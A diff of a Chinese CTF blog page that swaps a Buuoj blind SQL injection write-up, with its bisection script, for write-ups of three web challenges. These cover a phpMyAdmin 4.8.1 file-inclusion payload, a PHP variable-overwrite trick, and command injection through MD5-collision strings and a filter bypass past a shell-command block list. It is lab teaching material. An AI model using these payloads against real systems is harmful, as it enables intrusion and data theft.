@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <link rel="icon" href="/images/failure.ico">
   
-  <title>Buuoj Hack World 题解 | Err0r233</title>
+  <title>Buuoj题目(3) | Err0r233</title>
   <meta name="author" content="Err0r2333" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -14,21 +14,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <meta name="format-detection" content="telphone=no, email=no" />
   
-    <meta name="keywords" content="POST, SQL_Injection" />
+    <meta name="keywords" content="Web" />
   
-  <meta name="description" content="续接上文">
+  <meta name="description" content="做做buuoj上的web题，本萌新纯采集，轻喷（（（ 没想到这个连续剧居然做到第三集了（？">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Buuoj Hack World 题解">
-<meta property="og:url" content="http://example.com/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:title" content="Buuoj题目(3)">
+<meta property="og:url" content="http://example.com/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/index.html">
 <meta property="og:site_name" content="Err0r233">
-<meta property="og:description" content="续接上文">
+<meta property="og:description" content="做做buuoj上的web题，本萌新纯采集，轻喷（（（ 没想到这个连续剧居然做到第三集了（？">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
-<meta property="article:published_time" content="2022-11-09T05:08:46.000Z">
-<meta property="article:modified_time" content="2022-11-21T08:13:10.423Z">
+<meta property="article:published_time" content="2022-12-24T03:28:18.000Z">
+<meta property="article:modified_time" content="2022-12-24T05:32:01.068Z">
 <meta property="article:author" content="Err0r2333">
-<meta property="article:tag" content="SQL_Injection">
-<meta property="article:tag" content="POST">
+<meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/failure.ico">
 <meta name="twitter:site" content="@Err0r2333">
@@ -162,15 +161,15 @@
 
             <article itemscope itemtype="https://schema.org/Article">
     
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/">
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center" itemprop="name headline">Buuoj Hack World 题解</h1>
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">Buuoj题目(3)</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><time datetime="2022-11-09T05:08:46.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2022-11-09</time></li>
+                <li><time datetime="2022-12-24T03:28:18.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2022-12-24</time></li>
                 <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                     <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
                 </li>
@@ -178,12 +177,12 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        1397
+                        ~5.59K
                     
                     字
                 </li>
                 
-                    <li id="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/" class="leancloud_visitors" data-flag-title="Buuoj Hack World 题解">
+                    <li id="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/" class="leancloud_visitors" data-flag-title="Buuoj题目(3)">
                         <i class="fa fa-eye"></i>
                         <span class="leancloud-visitors-count"> </span> 次阅读
                     </li>
@@ -195,52 +194,107 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1669018390423"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1671859921068"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
             
             <hr />
-            <div itemprop="articleBody"><p>续接上文</p>
+            <div itemprop="articleBody"><p>做做buuoj上的web题，本萌新纯采集，轻喷（（（</p>
+<p>没想到这个连续剧居然做到第三集了（？</p>
 <span id="more"></span>
 
-<h2><span id="打开靶机">打开靶机</span></h2><p>同样是sql注入，题面已经提示我们flag在flag表的flag列里了</p>
-<p>接下来我们只需要查询就好了</p>
-<h2><span id="检测注入方式">检测注入方式</span></h2><p>输入1’ 回显bool(false)</p>
-<p>没有报错信息</p>
-<p>使用堆叠注入和联合查询 均回显SQL Injection Checked.</p>
-<img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/1.png" class title="被过滤">
+<h2><span id="gwctf-2019-我有一个数据库">[GWCTF 2019] 我有一个数据库</span></h2><p>打开靶机，一眼乱码…</p>
+<img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/4.png" class title="rwr">
+
+<p>使用charset改编码：</p>
+<img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/5.png" class title="rwr">
+
+<p>好，那就用dirsearch开找，由于万恶的反爬，还是只能用低线程：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python.exe .\dirsearch.py -u http://59a09390-<span class="number">2</span>10c-<span class="number">48e3</span>-a698-1e6e1dd52325.node4.buuoj.cn:<span class="number">81</span>/ -e * --timeout=<span class="number">2</span> -t <span class="number">1</span> -x <span class="number">400</span>,<span class="number">403</span>,<span class="number">404</span>,<span class="number">500</span>,<span class="number">503</span>,<span class="number">429</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/6.png" class title="sws">
+
+<p>跑出了phpmyadmin和robots.txt</p>
+<p>访问robots.txt</p>
+<p>发现提示是phpinfo.php</p>
+<p>所以直接选择看&#x2F;phpmyadmin&#x2F;</p>
+<p>发现是phpmyadmin 4.8.1的版本</p>
+<img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/7.png" class title="twt">
+
+<p>然后就上万能的CSDN…</p>
+<p>发现有本地包含漏洞</p>
+<p>直接拿漏洞打就完事了：</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=sql.php%253f../../../../../../../../../../flag</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/8.png" class title="uwu">
 
 
 
-<p>那只能考虑盲注，测试下是否有两种回显方式</p>
-<p>使用<code>1^1</code> 和<code>1^0</code> 测试</p>
-<p>发现1^1时，回显Error</p>
-<p>发现1^0时，回显Hello, glzjin wants a girlfriend.</p>
-<p>说明可以使用盲注</p>
-<img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/2.png" class title="盲注测试">
+<h2><span id="bjdctf2020-mark-loves-cat">[BJDCTF2020] Mark loves cat</span></h2><p>变量覆盖题。</p>
+<p>进入靶机，就是一个贼酷炫的前端页面（</p>
+<p>然后啥也点不了</p>
+<p>这个时候就要考虑是不是有dirsearch可以扫出来的东西了</p>
+<p>使用dirsearch 能够扫描出&#x2F;.git&#x2F;</p>
+<p>使用githack下载源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;<span class="comment">//对于POST传入的变量 a = b时，变成 $a=b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>; <span class="comment">//对于 GET传入的变量 a=b时，变成 $a = $b</span></span><br><span class="line">    <span class="comment">//可以使用GET传入变量将上面的三个变量覆盖成$flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);<span class="comment">//exit函数，输出一条信息，并退出当前脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
 
-<img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/3.png" class title="盲注测试">
+<p>所以思路很清晰，只需要将上面那三个变量选一个覆盖成$flag，然后再满足你所选择变量的exit条件即可</p>
+<p>(虽然但是我到现在都不知道handsome要怎么做，怎么让flag&#x3D;一个变量，这个变量又不能等于flag啊)</p>
+<p>方法一：</p>
+<p>如果选择yds：</p>
+<p>首先将yds覆盖成flag：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure>
 
-<p>直接跑脚本就行了</p>
-<p>把昨天的脚本复制一下，post传参名称改为id就好了（题目提示要我们提供id）</p>
-<h2><span id="payload">Payload</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> times</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span> : <span class="string">&quot;1^(ascii(substr((select(group_concat(flag))from(flag)),%d,1))&lt;%d)&quot;</span>%(i,mid)</span><br><span class="line">        &#125;</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res +=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br></pre></td></tr></table></figure>
+<p>然后…</p>
+<p>如果GET传入flag和POST传入的flag都是空的话，就exit了</p>
+<p>所以直接结束</p>
+<p>方法二：</p>
+<p>如果选择is：</p>
+<p>还是先将is覆盖成flag：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag</span><br></pre></td></tr></table></figure>
 
-<p>但是这里跑是跑不出结果的</p>
-<h3><span id="问题分析">问题分析</span></h3><p>测试语句</p>
-<p><code>1^(ascii(substr((select(group_concat(flag))from(flag)),1,1))&lt;104)</code> (因为flag的第一个字母f的ascii是102)</p>
-<p>发现SQL Injection Checked</p>
-<p>所以说某些词被检测到了</p>
-<p>经测试..</p>
-<p>当输入<code>select(group_concat(flag))</code>时，检测到了SQL注入</p>
-<h3><span id="修改payload">修改Payload</span></h3><p><strong>如果列内只有一个数据，可以不使用group_concat</strong></p>
-<p><strong>因为flag列只有一个flag（</strong></p>
-<p>所以脚本payload改为</p>
-<p><code>1^(ascii(substr((select(flag)from(flag)),%d,1))&lt;%d)%(i,mid)</code></p>
-<p>成功拿到flag</p>
-<img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/4.png" class title="结束">
+<p>看条件，如果get或者post传入flag的值为flag时，exit</p>
+<p>所以后面传入flag&#x3D;flag即可</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure>
 
-<p>PS：<del>不要直接copy我的flag，这个题是动态flag</del></p>
+<img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/1.png" class title="owo">
+
+
+
+<h2><span id="安洵杯-2019-easy_web">[安洵杯 2019] easy_web</span></h2><p>打开一看，也是啥都没有。。。</p>
+<p>不过首页那个img&#x3D;比较奇怪，看起来像base64加密</p>
+<p>把他拖入CyberChef，发现其经过了1次Hex加密和2次base64加密</p>
+<p>最初的结果是555.png</p>
+<p>大抵就是那张图片？</p>
+<p>利用这个原理，我们将555.png改为index.php，然后进行同样的加密，尝试获取源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));//img解密</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;//post的值a不能等于b，但是a的md5与b的md5值要强相等</span><br><span class="line">        echo `$cmd`;//echo + 反引号 相当于命令执行</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里最大的问题就是如何使得一个字符串a的值不等于b，md5的值又要强相等（如果是两个等号，可以使用0e开头的md5）</p>
+<p>使用 fastcoll 快速MD5碰撞生成器：</p>
+<p>可以构建两个md5值一样，但是内容完全不一样的字符串</p>
+<p>使用方法如下：</p>
+<ul>
+<li>创建一个文本文件，写入内容，命名</li>
+<li>cmd运行：</li>
+<li>fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt（其中init是你创建的文本文件，1.txt和2.txt是生成的两个文本的txt文件）</li>
+</ul>
+<p>然后需要进行一步url编码才能够正常使用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>))===<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)!=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>result：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=qwq%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00I%EC%91%C5Q%87a%CAzE%92%5D%D4%FF%EB%B1%C8%BE%F7EZq%ADJEb%82u%95%80%8B%FF%0C%F3%B8%D8P%8Eb%E7%0B%C8O%199%12%7Df%5El%ADE%BF%CB%95Z%C4%60%84%3A%8E%8F%85%18%C2%D0%9D%D7Z%28%90%E3%3DP%B6%D8%9B%89%A0%CEq%05%CDa%06%90%83%8Bv%EF%DF%CBOQ%A3%C1%AA%10%AD-%96%89z%D6%AB%93%E7X%D2%02%DE%3E%B4%F9%87%CF%B6%C4%D2-%2B%10%D5%F5%11%049%3D</span><br><span class="line">b=qwq%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00I%EC%91%C5Q%87a%CAzE%92%5D%D4%FF%EB%B1%C8%BE%F7%C5Zq%ADJEb%82u%95%80%8B%FF%0C%F3%B8%D8P%8Eb%E7%0B%C8O%199%92%7Df%5El%ADE%BF%CB%95Z%C4%60%84%BA%8E%8F%85%18%C2%D0%9D%D7Z%28%90%E3%3DP%B6%D8%9B%89%A0%CEq%05%CD%E1%06%90%83%8Bv%EF%DF%CBOQ%A3%C1%AA%10%AD-%96%89z%D6%AB%93%E7X%D2%82%DD%3E%B4%F9%87%CF%B6%C4%D2-%2B%10%D5u%11%049%3D</span><br></pre></td></tr></table></figure>
+
+<p>由于字符串比较长，所以使用burp进行Post传参：对于过滤，使用反斜杠绕过，空格使用%20进行url编码（burp里面打那个空格直接bad request了）：</p>
+<img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/2.png" class title="owo">
+
+<p>找到flag</p>
+<p>直接cat &#x2F;flag</p>
+<img src="/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/3.png" class title="pwp">
+
+
+
 </div>
         </div>
         
@@ -296,7 +350,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://example.com/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/",
+                text: "http://example.com/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -308,9 +362,10 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://example.com/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/";
-            const title         = "「Buuoj Hack World 题解」";
-            const excerpt       = `续接上文`;
+            const hostUrl       = "http://example.com/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/";
+            const title         = "「Buuoj题目(3)」";
+            const excerpt       = `做做buuoj上的web题，本萌新纯采集，轻喷（（（
+没想到这个连续剧居然做到第三集了（？`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -329,10 +384,10 @@
             <div class="footer-tag clearfix">
                 <div class="pull-left">
                 <i class="fa fa-tags"></i>
-                    <a class="tag-none-link" href="/tags/POST/" rel="tag">POST</a>, <a class="tag-none-link" href="/tags/SQL-Injection/" rel="tag">SQL_Injection</a>
+                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2022-11-21T08:13:10.423Z" itemprop="dateModified">最后编辑：2022-11-21</time>
+                    <time datetime="2022-12-24T05:32:01.068Z" itemprop="dateModified">最后编辑：2022-12-24</time>
                 </div>
             </div>
         </footer>
@@ -341,13 +396,9 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" NewStarCTF SQL注入题" href="/2022/11/08/NewStarCTF-SQL注入题/">&lt; 上一篇</a>
+                <a title=" Dandelin双球模型" href="/2022/12/19/Dandelin双球模型/">&lt; 上一篇</a>
             </div>
             
-            
-            <div class="nav-next clearfix">
-                <a title=" 看看蚁剑流量包" href="/2022/11/10/看看蚁剑流量包/">下一篇 &gt;</a>
-            </div>
             
         </nav>
     
@@ -362,7 +413,7 @@
                 appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
                 visitor: true,
                 enableQQ: false,
-                path: '/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/'
+                path: '/2022/12/24/Buuoj%E9%A2%98%E7%9B%AE-3/'
                 
             });
         }
